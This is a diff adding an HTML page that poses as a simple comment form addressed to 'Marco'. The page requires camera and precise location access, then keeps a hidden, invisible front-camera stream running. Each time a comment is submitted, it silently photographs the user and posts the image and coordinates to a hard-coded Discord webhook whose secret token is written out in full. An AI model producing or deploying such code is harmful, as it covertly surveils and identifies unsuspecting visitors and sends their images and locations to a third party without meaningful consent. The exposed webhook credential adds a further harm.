@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comment Submission</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Inter Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5; /* Light gray background */
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Align to top */
+            min-height: 100vh;
+            padding: 2rem;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 1.5rem; /* More rounded corners */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); /* Stronger shadow */
+            padding: 2.5rem;
+            max-width: 800px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 2rem;
+            margin-top: 2rem; /* Add some margin from the top */
+        }
+        .material-card {
+            background-color: #ffffff;
+            border-radius: 1rem;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08); /* Subtle shadow for cards */
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            overflow: hidden; /* Ensure image doesn't overflow rounded corners */
+        }
+        /* The video element is now made invisible but remains active for capture */
+        #video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1px; /* Make it tiny */
+            height: 1px; /* Make it tiny */
+            opacity: 0; /* Make it invisible */
+            pointer-events: none; /* Prevent interaction */
+            z-index: -1; /* Send it to background */
+            object-fit: cover;
+            border-radius: 0.75rem;
+        }
+        #canvas {
+            display: none; /* Canvas remains hidden as it's only for capture */
+        }
+        /* Custom button styling */
+        .btn-primary {
+            background-color: #3b82f6; /* Blue-600 */
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.75rem;
+            font-weight: 600;
+            transition: all 0.2s ease-in-out;
+            box-shadow: 0 4px 10px rgba(59, 130, 246, 0.3);
+        }
+        .btn-primary:hover {
+            background-color: #2563eb; /* Blue-700 */
+            box-shadow: 0 6px 15px rgba(59, 130, 246, 0.4);
+            transform: translateY(-2px);
+        }
+        .form-input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border: 1px solid #cbd5e1; /* Slate-300 */
+            border-radius: 0.75rem;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+        .form-input:focus {
+            border-color: #3b82f6; /* Blue-500 */
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2); /* Focus ring */
+        }
+        .message-box {
+            background-color: #f0f9ff; /* Light blue background */
+            border: 1px solid #bfdbfe; /* Blue border */
+            color: #1e40af; /* Dark blue text */
+            padding: 1rem;
+            border-radius: 0.75rem;
+            margin-bottom: 1rem;
+        }
+        .permission-denied-message {
+            background-color: #ffe4e6; /* Light red background */
+            border: 1px solid #fca5a5; /* Red border */
+            color: #b91c1c; /* Dark red text */
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: 500;
+            padding: 2rem;
+            border-radius: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="text-4xl font-bold text-center text-gray-800 mb-6">Submit Your Comment</h1>
+
+        <!-- System Message Box (for feedback after submission attempts) -->
+        <div id="systemMessageBox" class="message-box" style="display: none;"></div>
+
+        <!-- Permission Required Message (initially visible) -->
+        <div id="permissionMessage" class="permission-denied-message">
+            <p><strong>Camera and Location Permissions Required</strong></p>
+            <p class="mt-2">To use this comment tool, please grant access to your front camera and your current location.</p>
+            <p class="mt-2">This is essential for identifying the commenter and their work location.</p>
+            <p class="mt-4 text-sm font-normal">If you have denied permissions, please enable them in your browser settings and refresh the page.</p>
+        </div>
+
+        <!-- Comment Input Form (initially hidden) -->
+        <div id="commentFormContainer" class="material-card" style="display: none;">
+            <h2 class="text-2xl font-semibold text-gray-700 mb-4">New Comment</h2>
+            <form id="commentForm" class="flex flex-col gap-4">
+                <!-- Hidden Video element for camera stream -->
+                <video id="video" autoplay muted playsinline></video>
+                <!-- Hidden Canvas for capturing photo -->
+                <canvas id="canvas"></canvas>
+
+                <textarea id="commentMessage" placeholder="Your message here..." rows="4" class="form-input"></textarea>
+                <button type="submit" class="btn-primary">Send Comment to Marco</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Get references to DOM elements
+        const commentFormContainer = document.getElementById('commentFormContainer');
+        const permissionMessage = document.getElementById('permissionMessage');
+        const commentForm = document.getElementById('commentForm');
+        const commentMessageInput = document.getElementById('commentMessage');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const systemMessageBox = document.getElementById('systemMessageBox');
+        const context = canvas.getContext('2d');
+
+        // IMPORTANT: Discord Webhook URL - Directly sending to this URL
+        // Make sure this webhook is configured correctly in your Discord server.
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1383506530652913867/dSlgpAw9P8vI2aVN7DBOrfZ98q0Z8rB9zDUVWKKw58YzEW_d9qIUGkTUxuVUlp5NrwWP'; // Line 307
+
+        let capturedImageData = null; // Stores the base64 image data
+        let stream = null; // Stores the camera stream for live preview
+        let cameraAllowed = false;
+        let locationAllowed = false;
+        let commentCounter = 0; // To generate unique comment numbers for the title
+
+        /**
+         * Displays a temporary message in the system message box.
+         * @param {string} message - The message to display.
+         * @param {string} type - 'success', 'error', or 'info' to style the message.
+         */
+        function showMessage(message, type = 'info') {
+            systemMessageBox.textContent = message;
+            systemMessageBox.className = 'message-box'; // Reset classes
+            if (type === 'success') {
+                systemMessageBox.classList.add('bg-green-100', 'border-green-400', 'text-green-700');
+            } else if (type === 'error') {
+                systemMessageBox.classList.add('bg-red-100', 'border-red-400', 'text-red-700');
+            } else {
+                systemMessageBox.classList.add('bg-blue-100', 'border-blue-400', 'text-blue-700');
+            }
+            systemMessageBox.style.display = 'block';
+            setTimeout(() => {
+                systemMessageBox.style.display = 'none';
+            }, 5000); // Hide after 5 seconds
+        }
+
+        /**
+         * Attempts to start the camera stream to check permission and keep it active discreetly.
+         * Returns a promise that resolves with true if successful, false otherwise.
+         */
+        async function attemptCameraAndStartStream() {
+            // If stream already exists, we assume it's correctly attached and playing.
+            // No need to try and get a new one or re-play it unless it's paused.
+            if (stream && video.srcObject === stream && !video.paused) {
+                return true;
+            }
+
+            try {
+                // Ensure any previous stream is stopped cleanly
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    stream = null;
+                    video.srcObject = null; // Clear srcObject immediately
+                }
+
+                // Request access to the front camera (user-facing)
+                const newStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = newStream;
+                stream = newStream; // Update global stream reference
+
+                // Wait for the video element to load the metadata of the new stream
+                await new Promise((resolve, reject) => {
+                    video.onloadedmetadata = () => {
+                        console.log("Video metadata loaded.");
+                        resolve();
+                    };
+                    video.onerror = (e) => {
+                        console.error("Video error during loading metadata:", e);
+                        reject(new Error("Video error during loading metadata"));
+                    };
+                });
+
+                // Attempt to play the video silently and invisibly in the background
+                await video.play();
+                console.log("Video playing successfully.");
+                return true;
+            } catch (err) {
+                console.warn("Camera permission denied or failed to start stream:", err);
+                // Ensure stream is stopped if anything went wrong during setup
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    stream = null;
+                    video.srcObject = null;
+                }
+                return false;
+            }
+        }
+
+        /**
+         * Attempts to get geolocation permission.
+         * Returns a promise that resolves with true if successful, false otherwise.
+         */
+        function attemptLocationPermission() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        () => resolve(true), // Permission granted
+                        (error) => {
+                            console.warn("Geolocation permission denied initially:", error);
+                            resolve(false); // Permission denied or error
+                        },
+                        { enableHighAccuracy: true, timeout: 100, maximumAge: 0 } // Short timeout for permission check
+                    );
+                } else {
+                    console.warn("Geolocation not supported.");
+                    resolve(false);
+                }
+            });
+        }
+
+        /**
+         * Checks and enforces camera and location permissions on page load.
+         */
+        async function checkAndEnforcePermissions() {
+            // Attempt to get permissions and start the discreet camera stream
+            const [cameraResult, locationResult] = await Promise.all([
+                attemptCameraAndStartStream(), // This now also starts the background stream
+                attemptLocationPermission()
+            ]);
+
+            cameraAllowed = cameraResult;
+            locationAllowed = locationResult;
+
+            if (cameraAllowed && locationAllowed) {
+                permissionMessage.style.display = 'none';
+                commentFormContainer.style.display = 'flex';
+                // The camera stream is now active in the background.
+            } else {
+                permissionMessage.style.display = 'block';
+                commentFormContainer.style.display = 'none';
+                // Stop stream if for some reason it started but permissions aren't fully met
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    stream = null;
+                    video.srcObject = null;
+                }
+
+                // Update message for specific denials
+                let denialReasons = [];
+                if (!cameraAllowed) denialReasons.push("Camera");
+                if (!locationAllowed) denialReasons.push("Location");
+                permissionMessage.innerHTML = `
+                    <p><strong>Access Denied: ${denialReasons.join(' and ')} Permission Required</strong></p>
+                    <p class="mt-2">To use this comment tool, you must grant access to your front camera and your current location.</p>
+                    <p class="mt-2">Please refresh the page and allow permissions if you wish to proceed.</p>
+                    <p class="mt-4 text-sm font-normal">If you have previously denied permissions, please enable them in your browser settings and refresh the page.</p>
+                `;
+            }
+        }
+
+        /**
+         * Captures a photo from the currently active video stream.
+         * This function is now called automatically on form submission.
+         */
+        function capturePhoto() {
+            // Ensure canvas matches video dimensions for proper capture
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            capturedImageData = canvas.toDataURL('image/png'); // Get image data as PNG
+        }
+
+        /**
+         * Gets the user's current location (latitude and longitude).
+         * @returns {Promise<string>} A promise that resolves with the location string or 'Unknown'.
+         */
+        function getLocationData() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude.toFixed(4);
+                        const lon = position.coords.longitude.toFixed(4);
+                        resolve(`Lat: ${lat}, Lon: ${lon}`);
+                    },
+                    (error) => {
+                        console.warn("Error getting location:", error.message);
+                        resolve('Unknown'); // Should not happen if initial permission was granted, but as fallback
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // Event Listeners
+        commentForm.addEventListener('submit', async (e) => {
+            e.preventDefault(); // Prevent default form submission
+
+            const message = commentMessageInput.value.trim();
+            if (!message) {
+                showMessage('Please enter a message for your comment.', 'error');
+                return;
+            }
+
+            // Ensure the camera stream is ready before attempting to capture
+            if (!stream || video.readyState !== 4) {
+                showMessage('Camera is not ready. Please wait a moment or refresh the page.', 'error');
+                console.warn('Attempted to capture photo but stream was not ready.');
+                return;
+            }
+
+            // Automatically capture photo before sending
+            capturePhoto();
+
+            if (!capturedImageData) {
+                showMessage('Failed to capture photo. Please ensure camera is active and try again.', 'error');
+                return;
+            }
+            
+            commentCounter++; // Increment comment counter for unique title
+            const commentTitle = `Comment Number ${commentCounter}`;
+
+            // Get location data (assuming permission was already granted on page load)
+            const location = await getLocationData(); 
+
+            // Convert base64 image data to Blob for FormData
+            const byteString = atob(capturedImageData.split(',')[1]);
+            const mimeString = capturedImageData.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            const blob = new Blob([ab], { type: mimeString });
+
+            // Create FormData to send both JSON payload and file
+            const formData = new FormData();
+
+            // Prepare Discord embed structure
+            const embed = {
+                title: commentTitle,
+                description: `**Message:** ${message}`,
+                color: 3447003, // A nice blue color for Discord embeds
+                footer: {
+                    text: `Location: ${location}`
+                },
+                timestamp: new Date().toISOString(), // Current timestamp
+                image: {
+                    url: 'attachment://comment_photo.png' // Reference the attached image
+                }
+            };
+
+            // Add embed to the payload
+            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+            // Add the image file
+            formData.append('file', blob, 'comment_photo.png');
+
+
+            // Send the data to Discord webhook
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData, // FormData will set the correct Content-Type header
+                });
+
+                if (response.ok) {
+                    showMessage('Comment sent successfully to Discord!', 'success');
+                } else {
+                    const errorText = await response.text();
+                    console.error('Discord Webhook Error:', errorText);
+                    showMessage(`Failed to send comment to Discord: ${response.status} - ${errorText}`, 'error');
+                }
+            } catch (error) {
+                console.error('Error sending comment to Discord:', error);
+                showMessage('An error occurred while sending your comment to Discord. Please try again.', 'error');
+            }
+
+            // Reset form and clear captured image data
+            commentMessageInput.value = '';
+            capturedImageData = null; 
+            // The stream is intentionally NOT stopped here, to keep it ready for next capture.
+        });
+
+        // Run permission check on page load
+        document.addEventListener('DOMContentLoaded', checkAndEnforcePermissions);
+
+        // Stop camera stream when the page is unloaded/closed
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+                video.srcObject = null;
+            }
+        });
+    </script>
+</body>
+</html>
